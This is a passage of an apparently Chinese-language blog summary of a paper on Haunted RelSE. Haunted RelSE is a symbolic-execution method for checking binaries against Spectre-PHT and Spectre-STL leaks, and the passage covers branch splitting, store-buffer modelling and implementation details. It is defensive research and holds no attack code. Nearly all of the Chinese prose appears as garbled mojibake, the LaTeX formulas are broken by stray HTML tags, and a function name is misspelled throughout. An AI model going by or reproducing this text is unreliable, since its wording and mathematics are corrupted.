, Ï•r, Ïˆ, . . .</em>  çš„é›†åˆè¡¨ç¤ºä¸º <code>Î¦</code> ï¼Œå…³ç³»è¡¨è¾¾å¼ $\widehat{\varphi}$ï¼Œ$\widehat{\psi}$, . . . çš„é›†åˆè¡¨ç¤ºä¸º <strong>Î¦</strong> ï¼Œ $\widehat{\varphi}$ å·¦ã€å³çš„å€¼è¡¨ç¤ºä¸º  $\widehat{\varphi _{|l}}$ ã€$\widehat{\varphi _{|r}}$ ï¼Œè‹¥$\widehat{\varphi} &#x3D; \langle \varphi \rangle$ ï¼Œåˆ™  $\widehat{\varphi _{|l}}$ ã€$\widehat{\varphi _{|r}}$ éƒ½è¢«å®šä¹‰ä¸º  $\widehat{\varphi}$ ï¼Œç¬¦å·æ•°ç»„ä¸Šçš„å‡½æ•° <code>select</code> ä¸ <code>store</code> çš„å…³ç³»è¡¨è¾¾å¼ä¸ºï¼š</p><p><img src="https://s2.loli.net/2023/01/27/HVZc2jtCybDEUQh.png" alt="image.png"></p><h1 id="0x03-HAUNTED-RELSE"><a href="#0x03-HAUNTED-RELSE" class="headerlink" title="0x03. HAUNTED RELSE"></a>0x03. HAUNTED RELSE</h1><p>ä¸ºäº†åˆ†æ SCTï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ RelSE ä»¥è€ƒè™‘ç¨‹åºçš„æ¨æµ‹è¯­ä¹‰ï¼ˆspeculative semanticsï¼‰ï¼Œè¿™åŒ…æ‹¬ <em>å¸¸è§„è¡¨è¾¾å¼</em> â€”â€”è¢«ä½œä¸ºä¸€ä¸ªå¥½çš„æ¨æµ‹ç»“æœè€Œæ‰§è¡Œçš„ä¸”ä¼šåœ¨æ¨æµ‹è¢«è§£å†³æ—¶ä¿å­˜çš„æŒ‡ä»¤â€”â€”ä»¥åŠæ‰€æœ‰å¯èƒ½çš„ <em>ç¬æ€æ‰§è¡Œ</em> â€”â€”è¢«ä½œä¸ºè¯¯æµ‹ä¸”ä¼šåœ¨æ¨æµ‹è§£å†³æ—¶è¢«ä¸¢å¼ƒçš„æŒ‡ä»¤ï¼›æœ¬èŠ‚æè¿°è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•â€”â€”åœ¨æœ€æ–°çš„å·¥å…·ä¸­ä½¿ç”¨ï¼ˆå‚è§ Table Vï¼‰â€”â€”ç ”ç©¶è€…ç§°ä¹‹ä¸º <em>Explicit</em> ï¼Œå› ä¸ºå…¶ç›´æ¥å»ºæ¨¡äº†ç¬æ€æ‰§è¡Œï¼Œå¹¶å±•ç°äº†ç ”ç©¶è€…çš„ä¼˜åŒ–æ¢ç´¢ç­–ç•¥ï¼Œç§°ä¹‹ä¸º <em>Haunted</em></p><h3 id="A-Spectre-PHT"><a href="#A-Spectre-PHT" class="headerlink" title="A. Spectre-PHT"></a>A. Spectre-PHT</h3><p><em>1ï¼‰Explicit RelSE for Spectre-PHT</em> ï¼š <em>Explicit</em> å°è¯•é€šè¿‡ç¬¦å·æ‰§è¡Œå»ºæ¨¡ Spectre-PHTâ€”â€”äº KLEESpectre ä¸­å¼•å…¥â€”â€”é€šè¿‡å°†æ¯ä¸ªæ¡ä»¶åˆ†æ”¯åˆ†æˆå››ä¸ªè·¯å¾„æ¥ç›´æ¥åœ°å»ºæ¨¡äº†ç¬æ€æ‰§è¡Œï¼›ä¾‹å¦‚ <code>Fig.1a</code> ä¸­çš„ç¨‹åºä¸ <code>Fig.1b</code> ä¸­çš„è¯¥ç¨‹åºçš„ç¬¦å·æ‰§è¡Œæ ‘ï¼Œåœ¨æ¡ä»¶æŒ‡ä»¤ <strong>if</strong> <code>c1</code> åï¼Œæ‰§è¡Œå°†åˆ†æˆå››ä¸ªè·¯å¾„ï¼š</p><ul><li>ä¸¤ä¸ª <em>å¸¸è§„è·¯å¾„</em> ï¼ˆregular pathï¼‰ï¼šå¦‚åŒæ ‡å‡†ç¬¦å·æ‰§è¡Œä¸€èˆ¬ï¼Œç¬¬ä¸€ä¸ªè·¯å¾„è·Ÿç€ <code>then</code> åˆ†æ”¯å¹¶å°†çº¦æŸ <code>(c1 == true)</code> æ·»åŠ åˆ°è·¯å¾„è°“è¯­ä¸­ï¼Œç¬¬äºŒæ¡è·¯å¾„è·Ÿç€ <code>else</code> åˆ†æ”¯å¹¶å°†çº¦æŸ <code>(c1 == false)</code> æ·»åŠ åˆ°è·¯å¾„è°“è¯­ä¸­</li><li>ä¸¤ä¸ª <em>ç¬æ€è·¯å¾„</em> ï¼ˆtransient pathï¼‰ï¼šä¸ºäº†ç»Ÿè®¡è¢«è¯¯åˆ¤åˆ° <code>true</code> çš„ç¬æ€æ‰§è¡Œï¼Œ<code>then</code> åˆ†æ”¯è¢«ä»¥çº¦æŸ <code>(c1 == false)</code> æ‰§è¡Œï¼Œä¸ºäº†ç»Ÿè®¡è¢«è¯¯åˆ¤åˆ° <code>false</code> çš„ç¬æ€æ‰§è¡Œï¼Œ<code>else</code> åˆ†æ”¯è¢«ä»¥çº¦æŸ <code>(c1 == true)</code> æ‰§è¡Œï¼›è¿™äº›ç¬æ€è·¯å¾„ä¼šåœ¨è¾¾åˆ° <em>æ¨æµ‹è¾¹ç•Œ</em> ï¼ˆspeculation boundï¼Œé€šå¸¸ç”±é‡æ’åºç¼“å†²åŒºçš„å¤§å°å†³å®šï¼‰åè¢«ä¸¢å¼ƒ</li></ul><p>ä¸ºäº†éªŒè¯ SCTï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤å†…å­˜è®¿é—®ä¸æ¡ä»¶çŠ¶æ€æ˜¯å¦åœ¨å¸¸è§„è·¯å¾„ä¸ç¬æ€è·¯å¾„ä¸Šéƒ½æ²¡æœ‰æ³„éœ²ç§˜å¯†ä¿¡æ¯ï¼›åœ¨å¸¸è§„è·¯å¾„ä¸Šæˆ‘ä»¬è¦ç¡®è®¤ç¨‹åºçš„ <em>æ§åˆ¶æµ</em> ä¸ <em>load å’Œ store æŒ‡ä»¤çš„ä¸‹æ ‡</em> å¹¶ä¸å†³å®šäºç§˜å¯†è¾“å…¥ï¼Œç„¶è€Œåœ¨ç¬æ€è·¯å¾„ä¸Šæˆ‘ä»¬ä»…ç¡®è®¤  <em>æ§åˆ¶æµ</em> ä¸ <em>load å’Œ store æŒ‡ä»¤çš„ä¸‹æ ‡</em>  ï¼Œå› ä¸ºåœ¨æ¨æµ‹æ‰§è¡Œä¸­ï¼Œå†…å­˜çš„ store æ“ä½œä¸º store buffer ä¸­çš„é˜Ÿåˆ—ï¼Œç›´åˆ°è¿‡æœŸä¹‹å‰å¯¹ç¼“å­˜éƒ½ä¸å¯è§</p><p><em>Problem with Explicit</em> ï¼šå¯¹äº <code>Fig. 1b</code>ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸¤æ¡å­æ ‘éƒ½ä¸ºå¸¸è§„æ‰§è¡Œä¸ç¬æ€æ‰§è¡Œ <code>then</code> åˆ†æ”¯çš„ç»“æœï¼ˆå³ å­æ ‘èµ·å§‹äºçŠ¶æ€ <code>A</code> ï¼‰ï¼Œå¯¹åº”äºä¸åŒè·¯å¾„è°“è¯­ä¸‹çš„ç›¸åŒæŒ‡ä»¤ï¼Œå‡†ç¡®åœ°è¯´ï¼Œè‹¥æˆ‘ä»¬å°† $\widehat{\psi _{cf} }$ ã€$\widehat{\psi _{ld} }$ ã€$\widehat{\psi <em>{st}}$ ç§°ä¸ºå­æ ‘ <code>A</code> ä¸­å¯¹åº”çš„ <em>æ§åˆ¶æµçŠ¶æ€ã€ load ä¸‹æ ‡ã€store ä¸‹æ ‡</em> çš„å…³ç³»è¡¨è¾¾å¼ï¼Œåˆ™å¯¹äºå¸¸è§„æ‰§è¡Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥ $seckeak(\pi \and c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{st}})$  ï¼Œå¯¹äºç¬æ€æ‰§è¡Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥ $seckeak(\pi \and \neg c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and \neg c</em>{1},\widehat{\psi _{ld}})$ï¼›æœ€ç»ˆç­‰ä»·äºæ£€æŸ¥å¦‚ä¸‹è¡¨è¾¾å¼ï¼š</p><p>$$<br>seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi _{st}})<br>$$</p><p>è¯¥è¡¨è¾¾å¼åŸºæœ¬è¿‘ä¼¼äºåœ¨æ²¡æœ‰çº¦æŸ <code>c1</code> çš„æƒ…å†µä¸‹ç¬¦å·åŒ–åœ°æ‰§è¡Œ <code>then</code> åˆ†æ”¯è‡³ $\delta$ï¼Œæ£€æŸ¥ load çš„ä¸‹æ ‡ $\widehat{\psi _{ld} }$ ä¸æ§åˆ¶æµè¡¨è¾¾å¼ $\widehat{\psi _{cf} }$ï¼Œä»…å°† <code>c1</code> æ·»åŠ åˆ° store ä¸‹æ ‡ $\widehat{\psi _{st} }$ çš„æ£€æŸ¥ä¸­</p><p><em>è¿™æ ·çš„å‘ç°è®©ç ”ç©¶è€…è®¾è®¡å‡ºæ¥ Explicit RelSE çš„ä¼˜åŒ–æ–¹æ³•ï¼šæ¢ç´¢ä¸€ä¸ªå•ç‹¬çš„åŒæ—¶åŒ…å«ç¨‹åºçš„å¸¸è§„ä¸ç¬æ€è¡Œä¸ºçš„æ¨æµ‹è·¯å¾„ï¼Œä»¥åœ¨ä¿å­˜ä¸€ä¸ªç­‰ä»·ç»“æœçš„åŒæ—¶å¯¹çŠ¶æ€è¿›è¡Œå‰ªæ</em></p><p><em>2ï¼‰Haunted RelSE for Spectre-PHT</em>  ï¼šç›¸è¾ƒäºå°†æ‰§è¡Œåˆ†ä¸ºå››ä¸ªè·¯å¾„ï¼ŒHaunted RelSE ä»…å°†å…¶åˆ†ä¸ºä¸¤ä¸ªè·¯å¾„ï¼Œå¦‚ <code>Fig. 1c</code> æ‰€ç¤ºï¼Œåœ¨æ¡ä»¶åˆ†æ”¯ <strong>if</strong> <code>c1</code> ä¹‹åï¼Œæ‰§è¡Œå°†åˆ†ä¸ºä¸¤ä¸ªè·¯å¾„ï¼šä¸€ä¸ªè·¯å¾„è·Ÿéš <code>then</code> åˆ†æ”¯ï¼ˆå­æ ‘ <code>A</code>ï¼‰ï¼Œå¦ä¸€è·¯å¾„è·Ÿéš <code>else</code> åˆ†æ”¯ï¼ˆå­æ ‘ <code>B</code>ï¼‰ï¼Œä¸¤ä¸ªåˆ†æ”¯éƒ½åŒæ—¶å¯¹å¸¸è§„ä¸ç›¸åº”çš„ç¬æ€è·¯å¾„çš„è¡Œä¸ºè¿›è¡Œå»ºæ¨¡ï¼›æ­¤å¤–ï¼Œå…¶ä¼šå»¶è¿Ÿï¼ˆå¯èƒ½å…å»ï¼‰å¯¹è·¯å¾„çº¦æŸçš„æ£€æŸ¥â€”â€”ä»…ä¼šæ·»åŠ çº¦æŸ $c _{1} \or \neg c _{1}$ ï¼›æœ€ç»ˆï¼Œçº¦æŸå°†ä¼šåœ¨æ¡ä»¶åˆ†æ”¯å¤±æ•ˆåï¼ˆåœ¨  $\delta$ æ­¥åï¼‰è¢«æ·»åŠ åˆ°è·¯å¾„è°“è¯­ä¸­</p><p>åœ¨æ¯ä¸ªæ¡ä»¶çŠ¶æ€ ï¼ˆæˆ–æ˜¯ load æŒ‡ä»¤ï¼‰ï¼Œç ”ç©¶è€…ä¼šæ£€æŸ¥æ¡ä»¶ï¼ˆæˆ–æ˜¯ load ä¸‹æ ‡ï¼‰åœ¨å¸¸è§„æ‰§è¡Œä¸ç¬æ€æ‰§è¡Œä¸­éƒ½ä¸ä¾èµ–äºç§˜å¯†ï¼ˆå³ï¼Œä½¿ç”¨è·¯å¾„è°“è¯­ Ï€ï¼‰ï¼š$seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi _{ld}})$ ï¼›å¦ä¸€æ–¹é¢ï¼Œstore æŒ‡ä»¤ä»…ä¼šåœ¨å¸¸è§„æ‰§è¡Œä¸‹è¢«æ£€æŸ¥ï¼ˆå³ï¼Œä½¿ç”¨è·¯å¾„è°“è¯­ $\pi \and c _{1}$ï¼‰ï¼›æœ€ç»ˆï¼Œæ¡ä»¶ $(c1 &#x3D;&#x3D; true)$ ä¼šè¢«åœ¨  $\delta$ æ­¥åè¢«æ·»åŠ åˆ°è·¯å¾„è°“è¯­ä¸­</p><p><img src="https://s2.loli.net/2023/01/27/ba8tRJLwo6IzSnq.png" alt="Figure 1: Comparison of RelSE of program in Fig. 1a, where solid paths represent regular executions, dotted paths represent transient executions, and Î´ is the speculation depth."></p><h3 id="B-Spectre-STL"><a href="#B-Spectre-STL" class="headerlink" title="B.Spectre-STL"></a>B.Spectre-STL</h3><p><em>1) Explicit RelSE for Spectre-STL</em> ï¼šåœ¨å¾®æ¶æ„çº§åˆ«ï¼Œä¸€ä¸ª load æŒ‡ä»¤å¯ä»¥ä» store buffer çš„ä»»æ„åŒ¹é…çš„ entry æˆ–æ˜¯ä»ä¸»å­˜è·å–å…¶å€¼ï¼Œè¿™æ„å‘³ç€ load å¯ä»¥ç»•è¿‡ store buffer ä¸­æœªå†³çš„ store æ“ä½œç›´åˆ°è¾¾åˆ°ä¸»å­˜ï¼›ä¸ºäº†ç»Ÿè®¡è¿™ä¸€è¡Œä¸ºï¼Œ <em>Explicit</em> ç­–ç•¥â€”â€”åº”ç”¨äº PITCHFORK ä¸­â€”â€”é€šè¿‡ä¸ºæ¯ä¸ªå¯èƒ½çš„ load ä¸ store äº¤é”™è¿›è¡Œç¬¦å·æ‰§è¡Œåˆ†æ”¯ä»¥ç›´æ¥å»ºæ¨¡ç¬æ€æ‰§è¡Œ</p><p>è€ƒè™‘ <code>Fig.2a</code> ä¸­çš„ç¨‹åºï¼Œå¯¹äº store æŒ‡ä»¤çš„ç¬¦å·æ‰§è¡Œç»™å‡º <code>Fig. 2b </code> ä¸­å®šä¹‰çš„ç¬¦å·åŒ–å†…å­˜ $\mu _{3}$ï¼Œå…¶ä¸ºä» <code>initial_memory</code> å¼€å§‹çš„ä¸€ç³»åˆ—ç¬¦å·åŒ– store æ“ä½œï¼›æœ‰äº†è¿™æ ·æŒ‰æ—¶é—´é¡ºåºçš„è¡¨ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ç”¨ç¬¦å·åŒ–å†…å­˜ä¸­çš„æœ€å <code>|SB|</code> æ¬¡ store æ“ä½œæ¥å®šä¹‰ä¸€ä¸ªå¤§å°ä¸º <code>|SB|</code> çš„ store bufferï¼›ç±»ä¼¼çš„ï¼Œä¸»å­˜ä¹Ÿå¯ä»¥é€šè¿‡ç§»é™¤ç¬¦å·åŒ–å†…å­˜ä¸­çš„æœ€å <code>|SB|</code> æ¬¡ store æ“ä½œè¿›è¡Œå®šä¹‰ï¼›ä»¥ä¸€ä¸ªå¤§å°ä¸º 2 çš„ store buffer ä¸ºä¾‹ï¼Œå½“ä¸»å­˜ç”± $\mu _{1}$ å®šä¹‰æ—¶ï¼Œæœ€åä¸¤æ¬¡ store æ„æˆäº† store buffer</p><p>ç¬¬ä¸€æ¡ load æŒ‡ä»¤ï¼ˆblock <code>A</code>ï¼‰å¯ä»¥ç»•è¿‡ store buffer ä¸­çš„æ¯ä¸€ä¸ª store æ“ä½œç›´åˆ°å…¶è¾¾åˆ°ä¸»å­˜ï¼Œå› æ­¤ <code>x</code> æœ‰ä¸‰ç§å¯èƒ½çš„å€¼ï¼Œå¦‚ <code>Fig. 2c</code> æ‰€ç¤ºï¼š</p><ul><li>å¸¸è§„å€¼ $r$ å¯¹åº”ä¸€ä¸ªæœ€è¿‘çš„ç¬¦å·åŒ–å†…å­˜ $\mu _{3}$ çš„ç¬¦å·åŒ–çš„ $select$ æ“ä½œï¼Œå› ä¸ºæ‰€æœ‰å…ˆå‰çš„ store æ“ä½œéƒ½è¢«æŒ‰é¡ºåºç¼–ç è¿›äº† $\mu _{3}$ ï¼Œè¿™å¯¹åº”ç€é¡ºåºæ‰§è¡Œ</li><li>ç¬¬ä¸€ä¸ªç¬æ€å€¼ $t _{2}$ é€šè¿‡ç»•è¿‡ store buffer ä¸­çš„ç¬¬ä¸€ä¸ª entry è€Œè·å¾—ï¼Œè¿™å¯¹åº”ç€ $\mu _{2}$ ä¸­çš„ä¸€ä¸ªç¬¦å·åŒ– $select$ æ“ä½œ</li><li>æœ€åä¸€ä¸ªç¬æ€å€¼ $t _{1}$â€‹ é€šè¿‡ç»•è¿‡ store buffer ä¸­çš„ç¬¬ä¸€ä¸ç¬¬äºŒä¸ª entry å¹¶ä»ä¸»å­˜å–å€¼è€Œè·å¾—ï¼Œè¿™å¯¹åº”ç€ $\mu _{1}$ ä¸­çš„ä¸€ä¸ªç¬¦å·åŒ– $select$ æ“ä½œ</li></ul><p>ç±»ä¼¼åœ°ï¼Œå˜é‡ <code>y</code> åŒæ ·æœ‰ä¸‰ç§å¯èƒ½çš„å–å€¼</p><p>å¦‚ <code>Fig. 2d </code> ä¸­æ‰€ç¤ºçš„ <em>Explicit</em> æ¢ç´¢ç­–ç•¥ä¸º load çš„æ¯ä¸ªèƒ½è·å–çš„å¯èƒ½çš„å€¼è¿›è¡Œç¬¦å·æ‰§è¡Œåˆ†æ”¯ï¼Œè¿™å°†å¾ˆå¿«å¯¼è‡´è·¯å¾„çˆ†ç‚¸ï¼Œæˆ‘ä»¬é€šè¿‡å®éªŒè¡¨æ˜ï¼ˆSection V-Cï¼‰å³ä¾¿æ˜¯åœ¨è¾ƒå°‘ä»£ç ä¸Šï¼ˆ100æ¡æŒ‡ä»¤ï¼‰è¿™ä¸ªé—®é¢˜ä¹Ÿå¾ˆéš¾è§£å†³</p><p><em>2) Haunted RelSE for Spectre-STL</em> ï¼šç ”ç©¶è€…é¦–å…ˆè§‚å¯Ÿåˆ°å¤§éƒ¨åˆ†è·¯å¾„éƒ½æ˜¯å¤šä½™çš„ï¼Œä¸€ä¸ª load å¯ä»¥é€šè¿‡å…ˆå‰çš„éåˆ«å store è¿›è¡Œä»£å¿ï¼Œè€ƒè™‘ <code>Fig. 2c </code>ä¸­çš„è¯„ä¼°ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿç¡®è®¤ load çš„ä¸‹æ ‡ $a$ ä¸ç¬¬äºŒä¸ª store çš„ä¸‹æ ‡ $a _{2}$ ä¸åŒï¼Œæ ¹æ®æ•°ç»„çš„å®šä¹‰ï¼Œæˆ‘ä»¬æœ‰ $t _{2} &#x3D; t _{1}$ ï¼Œç”±æ­¤è·¯å¾„ $x \to t _{2}$ ä¸å…¶æ‰€æœ‰çš„å­è·¯å¾„éƒ½æ˜¯å¤šä½™çš„ï¼› <em>ç ”ç©¶è€…åŸºäºä¸€ç§è‘—åçš„ç§°ä¹‹ä¸º read-over-write çš„å¯¹ç¬¦å·æ•°ç»„çš„ä¼˜åŒ–æ¥æ£€æµ‹ä¸å‰ªæå¤šä½™çš„æƒ…å†µ</em> ï¼ˆcasesï¼‰</p><p>ç„¶è€Œï¼Œå¯¹å¤šä½™æƒ…å†µçš„åˆå¹¶å¹¶ä¸è¶³ä»¥è§£å†³è·¯å¾„çˆ†ç‚¸ï¼ˆå‚è§ Section Vï¼‰ï¼Œç”±æ­¤ <em>ç ”ç©¶è€…æå‡ºä¸€ç§æ–°çš„ç¼–ç ä»¥åœ¨ä¸€ä¸ªå•ç‹¬çš„è·¯å¾„è°“è¯­ä¸­ä¿å­˜å‰©ä¸‹çš„æƒ…å†µ</em> ï¼Œå…¶ä½¿ç”¨ç¬¦å·åŒ–çš„ <em>if-then-else</em> æ¥åœ¨ä¸€ä¸ªå•ç‹¬çš„è¡¨ç¤ºä¸­ç¼–ç æ‰€æœ‰å¯èƒ½è¢« load å–çš„å€¼ï¼Œè€Œéä¸ºæ¯ä¸ªå¯èƒ½çš„æƒ…å†µè¿›è¡Œåˆ†æ”¯æ‰§è¡Œ</p><p>ä¾‹å¦‚ <code>Fig. 2c</code> ä¸­å¯¹ load è¡¨è¾¾å¼çš„è¯„ä¼°ï¼Œåœ¨å¯¹ç¬¬äºŒä¸ª load çš„è¯„ä¼°ä¹‹åï¼Œå˜é‡ $y$ å¯ä»¥å–å€¼ $râ€™,tâ€™<em>{1},tâ€™</em>{2}$ï¼Œç ”ç©¶è€…å¼•å…¥ä¸¤ä¸ªæ–°çš„å¸ƒå°”å˜é‡ $bâ€™ <em>{1}$ ä¸ $bâ€™ <em>{2}$ å¹¶æ„å»ºè¡¨è¾¾å¼ $(ite\ bâ€™</em>{1}tâ€™</em>{1}(ite\ bâ€™<em>{2}tâ€™</em>{2}râ€™))$ï¼Œæ±‚è§£å™¨å¯ä»¥è®© $y$ å–å¦‚ä¸‹å€¼ï¼š</p><ul><li>ç¬æ€å€¼ $tâ€™<em>{1}$ ï¼Œé€šè¿‡å°† $bâ€™</em>{1}$ è®¾ä¸º true</li><li>ç¬æ€å€¼ $tâ€™<em>{2}$ ï¼Œé€šè¿‡å°† $bâ€™</em>{1}$ è®¾ä¸º false ä¸” $bâ€™_{2}$ è®¾ä¸º true</li><li>å¸¸è§„å€¼ $r$ï¼Œé€šè¿‡å°† $bâ€™<em>{1}$ ä¸ $bâ€™</em>{2}$ éƒ½è®¾ä¸º false</li></ul><p>æœ€åï¼Œç¬æ€å€¼  $tâ€™<em>{1}$ ï¼ˆæˆ–æ˜¯  $tâ€™</em>{2}$ï¼‰ å¯ä»¥ç®€å•åœ°é€šè¿‡å°†  $bâ€™<em>{1}$ ï¼ˆæˆ–æ˜¯ $bâ€™</em>{2}$ï¼‰è®¾ä¸º false æ¥ä¸¢å¼ƒ </p><p><img src="https://s2.loli.net/2023/01/27/LK3SeluXqFkg5mb.png" alt="Figure 2: Speculative RelSE of program in Fig. 2a. The symbolic memory is given in Fig. 2b and the symbolic evaluation of load instructions is detailed in Fig. 2c. Figure 2d illustrates the symbolic execution tree obtained from the Explicit exploration strategy; and Fig. 2e, the tree obtained from Haunted RelSE, where solid paths denote regular executions and dotted paths denote transient executions."></p><h1 id="0x04-IMPLEMENTATION-OF-HAUNTED-RELSE"><a href="#0x04-IMPLEMENTATION-OF-HAUNTED-RELSE" class="headerlink" title="0x04. IMPLEMENTATION OF HAUNTED RELSE"></a>0x04. IMPLEMENTATION OF HAUNTED RELSE</h1><p>æœ¬èŠ‚ä»‹ç» Haunted RelSE çš„æŠ€æœ¯ç»†èŠ‚ï¼Œä¸»è¦å…³æ³¨äºç”¨ä»¥åˆ†æ SCT çš„äºŒè¿›åˆ¶çº§çš„ RelSE çš„å˜åŒ–</p><p>ç”±äºå¯¹æ•°æ®çš„ä¾èµ–é¡¹çš„å­˜åœ¨ï¼Œå¤§éƒ¨åˆ†æŒ‡ä»¤è‡ªç„¶åœ°æ‰§è¡Œæˆ–æ˜¯ä¸èƒ½è¢«é‡æ’åºï¼Œå…¶å®å¯¹äº Spectre-PHT æˆ‘ä»¬åªéœ€è¦è€ƒè™‘å¯¹æ¡ä»¶åˆ†æ”¯çš„é‡æ’åºï¼ˆSection IV-Aï¼‰å¹¶å¯¹ Spectre-STL é‡æ’åº load ä¸ store å³å¯ï¼ˆSection IV-Bï¼‰</p><p>ä¸€ä¸ªè¡¨ç¤ºä¸º $\sigma $ çš„ç¬¦å·é…ç½®ï¼ˆsymbolic configurationï¼‰ç”±ä»¥ä¸‹ç»„æˆï¼š</p><ul><li>å½“å‰ä½ç½® $l$ ï¼Œç”¨ä»¥è·å–ç¨‹åº $P$ ä¸­çš„å½“å‰æŒ‡ä»¤ $P[l]$</li><li>ç¬¦å·æ‰§è¡Œ  $\delta $  çš„å½“å‰æ·±åº¦</li><li>ä¸€ä¸ªç¬¦å·å¯„å­˜å™¨æ˜ å°„ $\rho$ ï¼Œå°†ç¨‹åºå˜é‡æ˜ å°„åˆ°å¯¹åº”çš„ç¬¦å·å€¼</li><li>ä¸¤ä¸ªè·¯å¾„è°“è¯­ $\pi$ ä¸ $\widetilde{\pi}$ ï¼ˆå…·ä½“å‚è§ Section IV-Aï¼‰</li><li>ä¸€ä¸ªç¬¦å·åŒ–å†…å­˜ $\widehat{\mu}$â€”â€”ä¸€å¯¹ç¬¦å·æ•°ç»„ã€å…¶ store æ“ä½œçš„ <em>è¿‡æœŸæ·±åº¦</em> ï¼ˆretirement depthï¼‰</li><li>ä¸€ç»„ç¬æ€çš„ load $\widetilde{\lambda}$ ï¼ˆå…·ä½“å‚è§ Section IV-Bï¼‰</li></ul><p>è®°å· $\sigma.f$ è¡¨ç¤ºé…ç½® $\sigma$ ä¸­çš„å­—æ®µ $f$ï¼Œç ”ç©¶è€…è¿˜å®šä¹‰äº†ä¸€ä¸ªå‡½æ•° $eval_expr(\sigma ,e)$ ç”¨ä»¥åœ¨ç¬¦å·é…ç½®  $\sigma $  ä¸­è®¡ç®—ä¸€ä¸ª DBA è¡¨è¾¾å¼ $e$ åˆ°ä¸€ä¸ªç¬¦å·å€¼</p><p>ç›¸æ¯”äºç›´æ¥å¯¹é‡æ’åºç¼“å†²åŒºè¿›è¡Œå»ºæ¨¡ï¼Œç ”ç©¶è€…ä½¿ç”¨ç¬¦å·æ‰§è¡Œçš„ <em>å½“å‰æ·±åº¦</em> ï¼ˆcurrent depthï¼‰æ¥è¿½è¸ªè¦å¤±æ•ˆï¼ˆretiredï¼‰çš„æŒ‡ä»¤ï¼Œä¸€æ¡æŒ‡ä»¤åœ¨è‡³å¤š âˆ† æ­¥ä¹‹åå¿…é¡»è¦é€€å‡ºï¼Œå…¶ä¸­ âˆ† ä¸ºé‡æ’åºç¼“å†²åŒºçš„å¤§å°ï¼›è¡¨è¾¾å¼è¢«é™„æ³¨äº†ä¸€ä¸ªæ·±åº¦ä»¥ç¡®è®¤å…¶æ˜¯å¦è¦é€€å‡ºï¼Œæˆ–æ˜¯å…¶æ˜¯å¦ä¾èµ–äºå†…å­˜ï¼Œä¾‹å¦‚å¯„å­˜å™¨æ˜ å°„ $\rho$ ä¸­çš„ä¸€ä¸ªå˜é‡ $v$ æ˜ å°„åˆ°ä¸€å¯¹ $(\widehat{\psi},\delta)$ ï¼Œå…¶ä¸­ $\delta$ ä¸ºæœ€è¿‘å†…å­˜è®¿é—®çš„å¤±æ•ˆæ·±åº¦ï¼ˆretirement depthï¼‰ï¼Œå½“ $\delta$ ä¸éœ€è¦åœ¨ä¸Šä¸‹æ–‡ä¸­æ—¶ï¼Œå…¶ä¾¿è¢«çœç•¥æ‰äº†</p><h3 id="A-Haunted-RelSE-for-Spectre-PHT"><a href="#A-Haunted-RelSE-for-Spectre-PHT" class="headerlink" title="A. Haunted RelSE for Spectre-PHT"></a>A. Haunted RelSE for Spectre-PHT</h3><p><em>1) Evaluation of conditional instructions</em> ï¼šä¸æ ‡å‡†çš„ç¬¦å·æ‰§è¡Œä¸åŒï¼Œæ¡ä»¶å¹¶ä¸ä¼šè¢«ç«‹åˆ»åŠ å…¥åˆ°è·¯å¾„è°“è¯­ä¸­ï¼Œè€Œæ˜¯ä¼šä¸å…¶é€€å‡ºæ·±åº¦ä¸€èµ·è¢«ä¿å­˜åœ¨ä¸€ä¸ª <em>æ¨æµ‹è·¯å¾„è°“è¯­</em> ï¼ˆspeculative path predicateï¼‰ $\widetilde{\pi}$ ä¸­ï¼›å½“è¾¾åˆ°ä¸€ä¸ªæ¡ä»¶çš„å¤±æ•ˆæ·±åº¦æ—¶ï¼Œå…¶ä¼šè¢«ä»æ¨æµ‹è·¯å¾„è°“è¯­ä¸­ç§»é™¤ï¼Œæ·»åŠ åˆ° <em>å¤±æ•ˆè·¯å¾„è°“è¯­</em> ï¼ˆretired path predicateï¼‰ $\pi$ ä¸­</p><p>å¯¹æ¡ä»¶åˆ†æ”¯çš„è¯„ä¼°å¦‚ <code>Algorithm 1</code> æ‰€ç¤ºï¼Œå‡½æ•°é¦–å…ˆä¼šè¯„ä¼°æ¡ä»¶çš„ç¬¦å·å€¼å¹¶ç¡®è®¤å…¶å¯ä»¥è¢«å®‰å…¨åœ°æ³„éœ²ï¼Œä¹‹åå…¶é€šè¿‡æ›´æ–°ä½ç½®ä¸æ¨æµ‹è·¯å¾„è°“è¯­  $\widetilde{\pi}$  ä»¥æ²¿ç€åˆ†æ”¯ <code>then</code>  è®¡ç®—åç»­çŠ¶æ€ $\sigma _{t}$ ã€æ²¿ç€åˆ†æ”¯ <code>else</code> è®¡ç®—åç»­çŠ¶æ€ $\sigma _{f}$ </p><p><img src="https://s2.loli.net/2023/01/27/eAi2Hs3fFEqlK4w.png" alt="image.png"></p><p><em>2) Determining speculation depth</em> 